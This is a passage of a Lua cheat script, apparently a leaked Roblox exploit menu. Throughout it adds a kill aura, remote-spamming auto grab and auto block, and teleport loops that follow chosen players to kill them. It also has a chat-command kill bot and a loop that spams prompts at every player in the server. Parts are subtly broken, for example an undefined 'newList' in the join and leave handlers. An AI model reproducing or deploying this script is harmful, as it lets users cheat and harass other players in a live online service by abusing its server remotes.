+end
+
+function _startBadZoneWatch()
+    if _badZoneConn then return end
+    _badZoneConn = RS.Heartbeat:Connect(function()
+        if not antiGrabEnabled then return end
+        local hrp = me.Character and me.Character:FindFirstChild("HumanoidRootPart")
+        if not hrp then return end
+        local dist = (hrp.Position - _badZonePos).Magnitude
+        if dist <= 10 then
+            if _lastSafePos then
+                hrp.CFrame = _lastSafePos
+                hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                _arc_resetState()
+            end
+        else
+            _lastSafePos = hrp.CFrame
+        end
+    end)
+end
+
+function _stopBadZoneWatch()
+    if _badZoneConn then _badZoneConn:Disconnect() _badZoneConn = nil end
+end
+
+-- Character event connections
+me.CharacterAdded:Connect(function(newChar)
+    _lastSafePos = nil
+    task.spawn(_arc_onCharacterAdded, newChar)
+    task.spawn(setupDeathTp, newChar)
+    task.spawn(setupAntiGrab, newChar)
+    if deathTpEnabled and lastDeathPos then
+        task.wait(0.3)
+        local hrp = newChar:FindFirstChild("HumanoidRootPart")
+        if hrp then hrp.CFrame = lastDeathPos end
+    end
+end)
+
+if me.Character then
+    task.spawn(setupDeathTp, me.Character)
+    task.spawn(setupAntiGrab, me.Character)
+end
+
+Players.PlayerAdded:Connect(function() task.wait(1) refreshTags() end)
+
+MainTab = Window:CreateTab("Trc's Leaked", 4483362458)
+
+-- Toggles (no "local")
+KillAuraToggle = MainTab:CreateToggle({
+    Name = "Kill Aura",
+    CurrentValue = false,
+    Flag = "KillAura",
+    Callback = function(Value)
+        running = Value
+        if running then
+            conn = RS.Heartbeat:Connect(hit)
+        else
+            if conn then conn:Disconnect() conn = nil end
+        end
+    end,
+})
+
+MainTab:CreateSlider({
+    Name = "Hit Multiplier",
+    Range = {1, 50},
+    Increment = 1,
+    Suffix = "x",
+    CurrentValue = 1,
+    Flag = "HitMult",
+    Callback = function(Value) hitMultiplier = Value end,
+})
+
+AutoBlockToggle = MainTab:CreateToggle({
+    Name = "Auto Block",
+    CurrentValue = false,
+    Flag = "AutoBlock",
+    Callback = function(Value)
+        blocking = Value
+        if blocking then
+            game:GetService("ReplicatedStorage").Packages.Knit.Services.CombatService.RF.Block:InvokeServer(true)
+            blockConn = RS.Heartbeat:Connect(function()
+                task.wait(1)
+                if blocking then game:GetService("ReplicatedStorage").Packages.Knit.Services.CombatService.RF.Block:InvokeServer(true) end
+            end)
+        else
+            if blockConn then blockConn:Disconnect() blockConn = nil end
+            game:GetService("ReplicatedStorage").Packages.Knit.Services.CombatService.RF.Block:InvokeServer(false)
+        end
+    end,
+})
+
+AntiRagToggle = MainTab:CreateToggle({
+    Name = "Anti Ragdoll",
+    CurrentValue = false,
+    Flag = "AntiRag",
+    Callback = function(Value)
+        AntiRagEnabled = Value
+        if AntiRagEnabled then startARC() else stopARC() end
+    end,
+})
+
+AntiGrabRagToggle = MainTab:CreateToggle({
+    Name = "Anti Grab Rag",
+    CurrentValue = false,
+    Flag = "AntiGrabRag",
+    Callback = function(Value)
+        AntiGrabRagEnabled = Value
+        if AntiGrabRagEnabled then startARC() else stopARC() end
+    end,
+})
+
+DeathTPToggle = MainTab:CreateToggle({
+    Name = "Death TP",
+    CurrentValue = false,
+    Flag = "DeathTP",
+    Callback = function(Value)
+        deathTpEnabled = Value
+        if not Value then lastDeathPos = nil end
+    end,
+})
+
+NoSlowToggle = MainTab:CreateToggle({
+    Name = "No Slow",
+    CurrentValue = false,
+    Flag = "NoSlow",
+    Callback = function(Value)
+        noSlowEnabled = Value
+        if noSlowEnabled then
+            noSlowConn = RS.Heartbeat:Connect(function()
+                local c = me.Character
+                local hum = c and c:FindFirstChildOfClass("Humanoid")
+                if hum and hum.WalkSpeed < 16 then hum.WalkSpeed = 16 end
+            end)
+        else
+            if noSlowConn then noSlowConn:Disconnect() noSlowConn = nil end
+        end
+    end,
+})
+
+AntiGrabToggle = MainTab:CreateToggle({
+    Name = "Anti Grab",
+    CurrentValue = false,
+    Flag = "AntiGrab",
+    Callback = function(Value)
+        antiGrabEnabled = Value
+        if antiGrabEnabled then _startBadZoneWatch() else _stopBadZoneWatch() end
+    end,
+})
+
+MainTab:CreateInput({
+    Name = "Anti Grab Delay",
+    PlaceholderText = "0.2",
+    RemoveTextAfterFocusLost = false,
+    Flag = "GrabDelay",
+    Callback = function(Text)
+        local val = tonumber(Text)
+        if val then antiGrabDelay = val end
+    end,
+})
+
+AutoGrabToggle = MainTab:CreateToggle({
+    Name = "Auto Grab",
+    CurrentValue = false,
+    Flag = "AutoGrab",
+    Callback = function(Value)
+        grabbing = Value
+        if grabbing then
+            task.spawn(function()
+                while grabbing do
+                    game:GetService("ReplicatedStorage").Packages.Knit.Services.CombatService.RF.Grab:InvokeServer()
+                    task.wait()
+                end
+            end)
+        end
+    end,
+})
+
+SpamNotifyToggle = MainTab:CreateToggle({
+    Name = "Spam Notify",
+    CurrentValue = false,
+    Flag = "SpamNotify",
+    Callback = function(Value)
+        spamming = Value
+        if spamming then
+            task.spawn(function()
+                while spamming do
+                    local msg = SpamMessageInput.CurrentValue or "default"
+                    for _, player in ipairs(Players:GetPlayers()) do
+                        if player ~= me then
+                            game:GetService("ReplicatedStorage").RequestPrompt:FireServer(70932517024004, msg, player, 0, 3, 0, 0, 0, 0)
+                        end
+                    end
+                    game:GetService("ReplicatedStorage").StopCarry:FireServer()
+                    task.wait()
+                end
+            end)
+        end
+    end,
+})
+
+SpamMessageInput = MainTab:CreateInput({
+    Name = "Spam Message",
+    PlaceholderText = "default",
+    RemoveTextAfterFocusLost = false,
+    Flag = "SpamMsg",
+    Callback = function(Text) end,
+})
+
+FriendsInput = MainTab:CreateInput({
+    Name = "Friends (space separated)",
+    PlaceholderText = "friend1 friend2",
+    RemoveTextAfterFocusLost = false,
+    Flag = "Friends",
+    Callback = function(Text)
+        friendsList = parseList(Text)
+        refreshTags()
+    end,
+})
+
+TargetsInput = MainTab:CreateInput({
+    Name = "Targets (space separated)",
+    PlaceholderText = "target1 target2",
+    RemoveTextAfterFocusLost = false,
+    Flag = "Targets",
+    Callback = function(Text)
+        targetsList = parseList(Text)
+        refreshTags()
+    end,
+})
+
+FriendTagToggle = MainTab:CreateToggle({
+    Name = "Friend Tag",
+    CurrentValue = false,
+    Flag = "FriendTag",
+    Callback = function(Value)
+        friendTagEnabled = Value
+        refreshTags()
+    end,
+})
+
+TargetTagToggle = MainTab:CreateToggle({
+    Name = "Target Tag",
+    CurrentValue = false,
+    Flag = "TargetTag",
+    Callback = function(Value)
+        targetTagEnabled = Value
+        refreshTags()
+    end,
+})
+
+-- Create Tab
+local KeybindTab = Window:CreateTab("Keybinds")
+
+-- Kill Aura Keybind Toggle
+KeybindTab:CreateToggle({
+    Name = "Enable Kill Aura Keybind (Default: L)",
+    CurrentValue = false,
+    Callback = function(Value)
+        killAuraKeybindEnabled = Value
+        if Value then
+            if killAuraKeybindConnection then
+                killAuraKeybindConnection:Disconnect()
+            end
+            killAuraKeybindConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+                if gameProcessed then return end
+                if input.KeyCode == Enum.KeyCode[killAuraKey] then
+                    toggleKillAura()
+                end
+            end)
+        else
+            if killAuraKeybindConnection then
+                killAuraKeybindConnection:Disconnect()
+                killAuraKeybindConnection = nil
+            end
+        end
+    end
+})
+
+-- Kill Aura Key Selection
+KeybindTab:CreateDropdown({
+    Name = "Kill Aura Key (don't change it or it will break and not work)",
+    Options = {"K", "L", "U", "I", "O", "P", "J", "H", "Y", "T"},
+    CurrentOption = "R",
+    Callback = function(Option)
+        killAuraKey = Option
+        if killAuraKeybindEnabled then
+            if killAuraKeybindConnection then
+                killAuraKeybindConnection:Disconnect()
+            end
+            killAuraKeybindConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+                if gameProcessed then return end
+                if input.KeyCode == Enum.KeyCode[killAuraKey] then
+                    toggleKillAura()
+                end
+            end)
+        end
+    end
+})
+
+-- Auto Grab Keybind Toggle
+KeybindTab:CreateToggle({
+    Name = "Enable Auto Grab Keybind (Default: G)",
+    CurrentValue = false,
+    Callback = function(Value)
+        autoGrabKeybindEnabled = Value
+        if Value then
+            if autoGrabKeybindConnection then
+                autoGrabKeybindConnection:Disconnect()
+            end
+            autoGrabKeybindConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+                if gameProcessed then return end
+                if input.KeyCode == Enum.KeyCode[autoGrabKey] then
+                    toggleAutoGrab()
+                end
+            end)
+        else
+            if autoGrabKeybindConnection then
+                autoGrabKeybindConnection:Disconnect()
+                autoGrabKeybindConnection = nil
+            end
+        end
+    end
+})
+
+-- Auto Grab Key Selection
+KeybindTab:CreateDropdown({
+    Name = "Auto Grab Key (dont change it or it will break)",
+    Options = {"G", "H", "F", "R", "T", "Y", "U", "I", "O", "P"},
+    CurrentOption = "Q",
+    Callback = function(Option)
+        autoGrabKey = Option
+        if autoGrabKeybindEnabled then
+            if autoGrabKeybindConnection then
+                autoGrabKeybindConnection:Disconnect()
+            end
+            autoGrabKeybindConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+                if gameProcessed then return end
+                if input.KeyCode == Enum.KeyCode[autoGrabKey] then
+                    toggleAutoGrab()
+                end
+            end)
+        end
+    end
+})
+
+-- UI Buttons (optional, for manual control)
+KeybindTab:CreateButton({
+    Name = "Toggle Kill Aura",
+    Callback = toggleKillAura
+})
+
+KeybindTab:CreateButton({
+    Name = "Toggle Auto Grab",
+    Callback = toggleAutoGrab
+})
+
+-- Create Commands Tab
+local CommandsTab = Window:CreateTab("Commands", nil)
+
+-- Variables
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local TextChatService = game:GetService("TextChatService")
+
+-- Command Bot Variables
+local selectedCommandUser = nil
+local isGivingCommands = false
+local commandListener = nil
+local currentKillTarget = nil
+local isKilling = false
+local killLoop = nil
+local isFixing = false
+local fixTimer = nil
+local currentSelectedName = ""
+local isStopped = false
+local stopLoop = nil
+
+-- Get chat channel
+local function getChatChannel()
+    local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+    return channel
+end
+
+-- Send message function
+local function sendMessage(message)
+    local channel = getChatChannel()
+    if channel then
+        channel:SendAsync(message)
+    end
+end
+
+-- Function to find player by partial name or display name
+local function findPlayerByName(input)
+    input = input:lower()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            -- Check real username
+            if player.Name:lower():sub(1, #input) == input then
+                return player
+            end
+            -- Check display name
+            if player.DisplayName and player.DisplayName:lower():sub(1, #input) == input then
+                return player
+            end
+            -- Check if input is contained in name
+            if player.Name:lower():match(input) then
+                return player
+            end
+            if player.DisplayName and player.DisplayName:lower():match(input) then
+                return player
+            end
+        end
+    end
+    return nil
+end
+
+-- Function to start stop teleporting (spam teleport to 52,20,24)
+local function startStopTeleport()
+    -- Stop any current kill loops
+    if killLoop then
+        killLoop:Disconnect()
+        killLoop = nil
+    end
+    isKilling = false
+    currentKillTarget = nil
+    
+    if stopLoop then
+        stopLoop:Disconnect()
+        stopLoop = nil
+    end
+    
+    isStopped = true
+    
+    -- Start spam teleporting to fix location
+    stopLoop = RunService.Heartbeat:Connect(function()
+        if not isStopped then
+            if stopLoop then stopLoop:Disconnect() end
+            return
+        end
+        
+        -- Get local character
+        local localCharacter = LocalPlayer.Character
+        if not localCharacter then
+            return
+        end
+        
+        local localHRP = localCharacter:FindFirstChild("HumanoidRootPart")
+        if not localHRP then
+            return
+        end
+        
+        -- Teleport to fix location
+        localHRP.CFrame = CFrame.new(52, 20, 24)
+        
+        -- Wait 0.01 seconds
+        task.wait(0.01)
+    end)
+end
+
+-- Function to stop current kill
+local function stopKill()
+    if killLoop then
+        killLoop:Disconnect()
+        killLoop = nil
+    end
+    isKilling = false
+    currentKillTarget = nil
+end
+
+-- Function to stop stop teleporting
+local function stopStopTeleport()
+    if stopLoop then
+        stopLoop:Disconnect()
+        stopLoop = nil
+    end
+    isStopped = false
+end
+
+-- Function to start killing a player
+local function startKilling(targetPlayer)
+    -- Stop any current stop teleporting
+    stopStopTeleport()
+    
+    -- Stop any current killing
+    stopKill()
+    
+    if not targetPlayer or not targetPlayer.Character then
+        return false
+    end
+    
+    isKilling = true
+    currentKillTarget = targetPlayer
+    
+    -- Start teleport loop
+    killLoop = RunService.Heartbeat:Connect(function()
+        if not isKilling or not currentKillTarget then
+            if killLoop then killLoop:Disconnect() end
+            return
+        end
+        
+        -- Check if target still exists and has character
+        if not currentKillTarget or not currentKillTarget.Parent then
+            stopKill()
+            return
+        end
+        
+        local targetCharacter = currentKillTarget.Character
+        if not targetCharacter then
+            return
+        end
+        
+        -- Check if target is dead
+        local targetHumanoid = targetCharacter:FindFirstChild("Humanoid")
+        if targetHumanoid and targetHumanoid.Health <= 0 then
+            -- Target is dead, teleport to respawn location
+            local localCharacter = LocalPlayer.Character
+            if localCharacter then
+                local localHRP = localCharacter:FindFirstChild("HumanoidRootPart")
+                if localHRP then
+                    localHRP.CFrame = CFrame.new(52, 20, 24)
+                end
+            end
+            return
+        end
+        
+        -- Get target's humanoidrootpart
+        local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
+        if not targetHRP then
+            return
+        end
+        
+        -- Get local character
+        local localCharacter = LocalPlayer.Character
+        if not localCharacter then
+            return
+        end
+        
+        local localHRP = localCharacter:FindFirstChild("HumanoidRootPart")
+        if not localHRP then
+            return
+        end
+        
+        -- Teleport inside target
+        local targetPos = targetHRP.Position
+        localHRP.CFrame = CFrame.new(targetPos)
+        
+        -- Wait 0.01 seconds
+        task.wait(0.01)
+    end)
+    
+    return true
+end
+
+-- Function to handle fix command
+local function handleFix()
+    if isFixing then return end
+    
+    isFixing = true
+    
+    -- Stop any current stop teleporting
+    stopStopTeleport()
+    
+    -- Stop any current killing
+    local wasKilling = isKilling
+    local killedTarget = currentKillTarget
+    
+    stopKill()
+    
+    -- Teleport to fix location once
+    local localCharacter = LocalPlayer.Character
+    if localCharacter then
+        local localHRP = localCharacter:FindFirstChild("HumanoidRootPart")
+        if localHRP then
+            localHRP.CFrame = CFrame.new(52, 20, 24)
+        end
+    end
+    
+    -- Send fix message
+    sendMessage("[] Fixing Bot")
+    
+    -- After 1 second, resume killing if there was a target
+    if fixTimer then
+        fixTimer:Disconnect()
+    end
+    
+    fixTimer = game:GetService("Timers"):After(1, function()
+        isFixing = false
+        if wasKilling and killedTarget and killedTarget.Parent then
+            -- Resume killing the previous target
+            startKilling(killedTarget)
+        end
+        fixTimer = nil
+    end)
+end
+
+-- Function to handle stop command
+local function handleStop()
+    -- Stop any current killing
+    if isKilling and currentKillTarget then
+        local targetName = currentKillTarget.Name
+        stopKill()
+        sendMessage("[+] Stopped Killing " .. targetName)
+    end
+    
+    -- Start spam teleporting to fix location
+    startStopTeleport()
+end
+
+-- Function to handle kill command
+local function handleKillCommand(args, sender)
+    if not args or args == "" then
+        return
+    end
+    
+    local targetName = args
+    local targetPlayer = findPlayerByName(targetName)
+    
+    if not targetPlayer then
+        sendMessage("[-] Player not found: " .. targetName)
+        return
+    end
+    
+    -- Check if already killing someone
+    if isKilling and currentKillTarget then
+        sendMessage("[-] Killing another user currently")
+        return
+    end
+    
+    -- Stop stop teleporting if active
+    stopStopTeleport()
+    
+    -- Start killing the target
+    if startKilling(targetPlayer) then
+        sendMessage("[+] Killing " .. targetPlayer.Name)
+    else
+        sendMessage("[-] Failed to kill " .. targetPlayer.Name)
+    end
+end
+
+-- Function to start listening to selected user's messages
+local function startListening()
+    if commandListener then
+        commandListener:Disconnect()
+    end
+    
+    if not selectedCommandUser then
+        return
+    end
+    
+    -- Listen for messages from the selected user
+    commandListener = TextChatService.MessageReceived:Connect(function(message)
+        -- Check if message is from selected user
+        if message.TextSource and message.TextSource.Name == selectedCommandUser.Name then
+            local text = message.Text
+            
+            -- Check for .kill command
+            if text:lower():match("^%.kill") then
+                local args = text:lower():gsub("%.kill", ""):gsub("^%s+", "")
+                handleKillCommand(args, selectedCommandUser)
+            end
+            
+            -- Check for .fix command
+            if text:lower() == ".fix" then
+                handleFix()
+            end
+            
+            -- Check for .stop command
+            if text:lower() == ".stop" then
+                handleStop()
+            end
+        end
+    end)
+end
+
+-- Function to stop listening
+local function stopListening()
+    if commandListener then
+        commandListener:Disconnect()
+        commandListener = nil
+    end
+end
+
+-- Function to get all players except local
+local function GetPlayerList()
+    local playerList = {}
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            table.insert(playerList, player.Name)
+        end
+    end
+    if #playerList == 0 then
+        table.insert(playerList, "No Players")
+    end
+    return playerList
+end
+
+-- Create Dropdown for selecting user
+local UserDropdown = CommandsTab:CreateDropdown({
+    Name = "Select User to Monitor",
+    Options = GetPlayerList(),
+    CurrentOption = "",
+    Multiple = false,
+    Flag = "CommandUser",
+    Callback = function(Options)
+        local selected = Options[1]
+        if selected and selected ~= "No Players" then
+            currentSelectedName = selected
+            selectedCommandUser = Players:FindFirstChild(selected)
+            Rayfield:Notify({
+                Title = "User Selected",
+                Content = "Monitoring: " .. selected,
+                Duration = 2
+            })
+            
+            -- If giving commands is enabled, restart listening
+            if isGivingCommands then
+                stopListening()
+                startListening()
+            end
+        end
+    end
+})
+
+-- Set default selection if players exist
+local playerList = GetPlayerList()
+if #playerList > 0 and playerList[1] ~= "No Players" then
+    UserDropdown:Set({playerList[1]})
+    currentSelectedName = playerList[1]
+    selectedCommandUser = Players:FindFirstChild(playerList[1])
+end
+
+-- Refresh Button
+CommandsTab:CreateButton({
+    Name = "Refresh Players",
+    Callback = function()
+        local newList = GetPlayerList()
+        UserDropdown:Set(newList)
+        
+        if #newList > 0 and newList[1] ~= "No Players" then
+            UserDropdown:Set({newList[1]})
+            currentSelectedName = newList[1]
+            selectedCommandUser = Players:FindFirstChild(newList[1])
+            Rayfield:Notify({
+                Title = "Players Refreshed",
+                Content = "Now monitoring: " .. newList[1],
+                Duration = 2
+            })
+            
+            -- Restart listening if enabled
+            if isGivingCommands then
+                stopListening()
+                startListening()
+            end
+        else
+            selectedCommandUser = nil
+            currentSelectedName = ""
+            if isGivingCommands then
+                stopListening()
+            end
+            Rayfield:Notify({
+                Title = "Players Refreshed",
+                Content = "No players found",
+                Duration = 2
+            })
+        end
+    end
+})
+
+-- Give Commands Toggle
+local GiveCommandsToggle = CommandsTab:CreateToggle({
+    Name = "Give Commands",
+    CurrentValue = false,
+    Flag = "GiveCommands",
+    Callback = function(Value)
+        isGivingCommands = Value
+        
+        if isGivingCommands then
+            if not selectedCommandUser then
+                Rayfield:Notify({
+                    Title = "Error",
+                    Content = "Please select a user first!",
+                    Duration = 3
+                })
+                GiveCommandsToggle:Set(false)
+                isGivingCommands = false
+                return
+            end
+            
+            startListening()
+            Rayfield:Notify({
+                Title = "Commands Enabled",
+                Content = "Listening to " .. selectedCommandUser.Name,
+                Duration = 3
+            })
+        else
+            stopListening()
+            stopKill()
+            stopStopTeleport()
+            Rayfield:Notify({
+                Title = "Commands Disabled",
+                Content = "Stopped listening",
+                Duration = 2
+            })
+        end
+    end
+})
+
+-- Variables
+local isSpamming = false
+local jumpLoop = nil
+local jumpDelay = 0.1 -- Delay between jumps in seconds
+
+-- Function to perform jump
+local function performJump()
+    local player = game.Players.LocalPlayer
+    local character = player.Character
+    if character then
+        local humanoid = character:FindFirstChild("Humanoid")
+        if humanoid and humanoid.Sit == false then -- Check if not sitting
+            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+        end
+    end
+end
+
+-- Function to start jump loop
+local function startJumpLoop()
+    jumpLoop = task.spawn(function()
+        while isSpamming do
+            performJump()
+            task.wait(jumpDelay)
+        end
+    end)
+end
+
+-- Function to toggle jump spam
+local function toggleJumpSpam()
+    isSpamming = not isSpamming
+    
+    if isSpamming then
+        startJumpLoop()
+        Rayfield:Notify({
+            Title = "Jump Spam",
+            Content = "Started! Jumping every " .. jumpDelay .. " seconds",
+            Duration = 3,
+        })
+    else
+        if jumpLoop then
+            task.cancel(jumpLoop)
+            jumpLoop = nil
+        end
+        Rayfield:Notify({
+            Title = "Jump Spam",
+            Content = "Stopped!",
+            Duration = 3,
+        })
+    end
+end
+
+local Section = CommandsTab:CreateSection("Anti Sit")
+
+-- Create toggle
+CommandsTab:CreateToggle({
+    Name = "Auto Jump Spam",
+    CurrentValue = false,
+    Flag = "JumpToggle",
+    Callback = function(Value)
+        toggleJumpSpam()
+    end,
+})
+
+-- Add slider to adjust jump speed
+local JumpSlider = CommandsTab:CreateSlider({
+    Name = "Jump Delay",
+    Range = {0.05, 1},
+    Increment = 0.01,
+    Suffix = "Seconds",
+    CurrentValue = 0.1,
+    Flag = "JumpDelay",
+    Callback = function(Value)
+        jumpDelay = Value
+        if isSpamming then
+            -- Restart loop with new delay
+            if jumpLoop then
+                task.cancel(jumpLoop)
+                jumpLoop = nil
+            end
+            startJumpLoop()
+            Rayfield:Notify({
+                Title = "Jump Speed Updated",
+                Content = "Now jumping every " .. jumpDelay .. " seconds",
+                Duration = 2,
+            })
+        end
+    end,
+})
+
+-- Optional: Add toggle for super jump (if you want)
+CommandsTab:CreateToggle({
+    Name = "Super Jump",
+    CurrentValue = false,
+    Flag = "SuperJump",
+    Callback = function(Value)
+        if Value then
+            -- Increase jump power
+            game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = 80
+            Rayfield:Notify({
+                Title = "Super Jump",
+                Content = "Enabled! Jump power increased",
+                Duration = 2,
+            })
+        else
+            -- Reset jump power
+            game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = 50
+            Rayfield:Notify({
+                Title = "Super Jump",
+                Content = "Disabled! Jump power reset",
+                Duration = 2,
+            })
+        end
+    end,
+})
+
+-- Startup notification
+Rayfield:Notify({
+    Title = "Loaded",
+    Content = "Toggle Auto Jump to start/stop",
+    Duration = 3,
+})
+
+CommandsTab:CreateParagraph({
+    Title = "Mandatory/Needed",
+    Content = "Enable Kill Aura located in the Main Tab!"
+})
+
+-- Add status section
+CommandsTab:CreateParagraph({
+    Title = "Status",
+    Content = "Select a user and enable 'Give Commands' to begin"
+})
+
+-- Add commands info
+CommandsTab:CreateParagraph({
+    Title = "Available Commands",
+    Content = ".kill {user} - Kill a player (partial names work)\n.fix - Stop killing, teleport to 52,20,24 once, then resume killing after 1 second\n.stop - Stop killing and spam teleport to 52,20,24"
+})
+
+-- Add example section
+CommandsTab:CreateParagraph({
+    Title = "Examples",
+    Content = ".kill alex\n.kill John\n.kill player123\n.fix\n.stop"
+})
+
+-- Auto update dropdown when players join/leave
+Players.PlayerAdded:Connect(function(player)
+    task.wait(0.5)
+    -- yo
+    if #newList > 0 and newList[1] ~= "No Players" and not selectedCommandUser then
+        UserDropdown:Set({newList[1]})
+        currentSelectedName = newList[1]
+        selectedCommandUser = Players:FindFirstChild(newList[1])
+        if isGivingCommands then
+            stopListening()
+            startListening()
+        end
+    end
+end)
+
+Players.PlayerRemoving:Connect(function(player)
+    task.wait(0.5)
+    -- yo
+    
+    if selectedCommandUser and selectedCommandUser.Name == player.Name then
+        selectedCommandUser = nil
+        currentSelectedName = ""
+        if isGivingCommands then
+            stopListening()
+            Rayfield:Notify({
+                Title = "User Left",
+                Content = "Monitored user left the game",
+                Duration = 2
+            })
+            GiveCommandsToggle:Set(false)
+        end
+        stopKill()
+        stopStopTeleport()
+        
+        if #newList > 0 and newList[1] ~= "No Players" then
+            UserDropdown:Set({newList[1]})
+            currentSelectedName = newList[1]
+            selectedCommandUser = Players:FindFirstChild(newList[1])
+        end
+    end
+    
+    -- If current kill target leaves, stop killing
+    if currentKillTarget and currentKillTarget.Name == player.Name then
+        stopKill()
+    end
+end)
+
+-- Clean up when script stops
+LocalPlayer.CharacterAdded:Connect(function()
+    if isKilling and currentKillTarget then
+        -- Resume killing if we had a target
+        startKilling(currentKillTarget)
+    end
+end)
+
+
+
+-- Create Auto Kill Tab
+local AutoKillTab = Window:CreateTab("Auto Kill", nil)
+
+local CoreSection = MainTab:CreateSection("Carry Status")
+
+-- Variables
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local selectedPlayer = nil
+local isAutoKilling = false
+local teleportLoop = nil
+local currentSelectedName = ""
+
+-- Function to get all players except local
+local function GetPlayerList()
+    local playerList = {}
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            table.insert(playerList, player.Name)
+        end
+    end
+    if #playerList == 0 then
+        table.insert(playerList, "No Players")
+    end
+    return playerList
+end
+
+-- Create Dropdown
+local PlayerDropdown = AutoKillTab:CreateDropdown({
+    Name = "Select Target",
+    Options = GetPlayerList(),
+    CurrentOption = "",
+    Multiple = false,
+    Flag = "TargetPlayer",
+    Callback = function(Options)
+        local selected = Options[1]
+        if selected and selected ~= "No Players" then
+            currentSelectedName = selected
+            selectedPlayer = Players:FindFirstChild(selected)
+            Rayfield:Notify({
+                Title = "Target Selected",
+                Content = "Target: " .. selected,
+                Duration = 2
+            })
+        end
+    end
+})
+
+-- Set default selection if players exist
+local playerList = GetPlayerList()
+if #playerList > 0 and playerList[1] ~= "No Players" then
+    PlayerDropdown:Set({playerList[1]})
+    currentSelectedName = playerList[1]
+    selectedPlayer = Players:FindFirstChild(playerList[1])
+end
+
+-- Refresh Button
+AutoKillTab:CreateButton({
+    Name = "Refresh Players",
+    Callback = function()
+        local newList = GetPlayerList()
+        PlayerDropdown:Set(newList)
+        
+        -- Auto select first player if available
+        if #newList > 0 and newList[1] ~= "No Players" then
+            PlayerDropdown:Set({newList[1]})
+            currentSelectedName = newList[1]
+            selectedPlayer = Players:FindFirstChild(newList[1])
+            Rayfield:Notify({
+                Title = "Players Refreshed",
+                Content = "Selected: " .. newList[1],
+                Duration = 2
+            })
+        else
+            selectedPlayer = nil
+            currentSelectedName = ""
+            Rayfield:Notify({
+                Title = "Players Refreshed",
+                Content = "No players found",
+                Duration = 2
+            })
+        end
+    end
+})
+
+-- Auto Kill Toggle
+local Toggle = AutoKillTab:CreateToggle({
+    Name = "Start Auto Kill",
+    CurrentValue = false,
+    Flag = "AutoKill",
+    Callback = function(Value)
+        isAutoKilling = Value
+        
+        if isAutoKilling then
+            -- Check if player is selected
+            if not selectedPlayer or selectedPlayer == LocalPlayer then
+                Rayfield:Notify({
+                    Title = "Error",
+                    Content = "Please select a valid target first!",
+                    Duration = 3
+                })
+                Toggle:Set(false)
+                isAutoKilling = false
+                return
+            end
+            
+            -- Check if target still exists
+            if not selectedPlayer.Character then
+                Rayfield:Notify({
+                    Title = "Error",
+                    Content = "Target has no character!",
+                    Duration = 3
+                })
+                Toggle:Set(false)
+                isAutoKilling = false
+                return
+            end
+            
+            -- Start the kill loop
+            teleportLoop = RunService.Heartbeat:Connect(function()
+                if not isAutoKilling then
+                    if teleportLoop then teleportLoop:Disconnect() end
+                    return
+                end
+                
+                -- Check if target still exists and has character
+                if not selectedPlayer or not selectedPlayer.Parent then
+                    Rayfield:Notify({
+                        Title = "Target Lost",
+                        Content = "Target no longer exists",
+                        Duration = 2
+                    })
+                    Toggle:Set(false)
+                    isAutoKilling = false
+                    return
+                end
+                
+                local targetCharacter = selectedPlayer.Character
+                if not targetCharacter then
+                    return
+                end
+                
+                -- Get target's humanoidrootpart
+                local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
+                
+                if not targetHRP then
+                    return
+                end
+                
+                -- Get local character
+                local localCharacter = LocalPlayer.Character
+                if not localCharacter then
+                    return
+                end
+                
+                local localHRP = localCharacter:FindFirstChild("HumanoidRootPart")
+                if not localHRP then
+                    return
+                end
+                
+                -- Teleport 8 studs above target
+                local targetPos = targetHRP.Position
+                local newPos = targetPos + Vector3.new(0, 8, 0)
+                localHRP.CFrame = CFrame.new(newPos)
+                
+                -- Wait 0.01 seconds
+                task.wait(0.01)
+            end)
+            
+            Rayfield:Notify({
+                Title = "Auto Kill",
+                Content = "Killing " .. selectedPlayer.Name,
+                Duration = 2
+            })
+        else
+            -- Stop killing
+            if teleportLoop then
+                teleportLoop:Disconnect()
+                teleportLoop = nil
+            end
+            Rayfield:Notify({
+                Title = "Auto Kill",
+                Content = "Stopped",
+                Duration = 2
+            })
+        end
+    end
+})
+
+-- Add status labels
+AutoKillTab:CreateParagraph({
+    Title = "Tutorial",
+    Content = "YOU MUST NEED Kill Aura Enabled, located in PVP Tab!"
+})
+
+-- Add info label
+AutoKillTab:CreateParagraph({
+    Title = "How to use",
+    Content = "1. Select a player from dropdown\n2. Click 'Refresh Players' to update list\n3. Toggle 'Start Auto Kill' to begin\n4. Script teleports you 8 studs above target every 0.01s"
+})
+
+-- Auto update dropdown when players join/leave
+Players.PlayerAdded:Connect(function(player)
+    task.wait(0.5)
+    -- yo
+    if #newList > 0 and newList[1] ~= "No Players" and not selectedPlayer then
+        PlayerDropdown:Set({newList[1]})
+        currentSelectedName = newList[1]
+        selectedPlayer = Players:FindFirstChild(newList[1])
+    end
+end)
+
+Players.PlayerRemoving:Connect(function(player)
+    task.wait(0.5)
+    -- yo
+    
+    -- Check if removed player was selected
+    if selectedPlayer and selectedPlayer.Name == player.Name then
+        selectedPlayer = nil
+        currentSelectedName = ""
+        if isAutoKilling then
+            Toggle:Set(false)
+            Rayfield:Notify({
+                Title = "Target Left",
+                Content = "Your target left the game",
+                Duration = 2
+            })
+        end
+        -- Auto select new player if available
+        if #newList > 0 and newList[1] ~= "No Players" then
+            PlayerDropdown:Set({newList[1]})
+            currentSelectedName = newList[1]
+            selectedPlayer = Players:FindFirstChild(newList[1])
+        end
+    end
+end)
+
+-- Success message
+Rayfield:Notify({
+    Title = "Script Loaded",
+    Content = "Auto Kill tab ready! Select a target to begin",
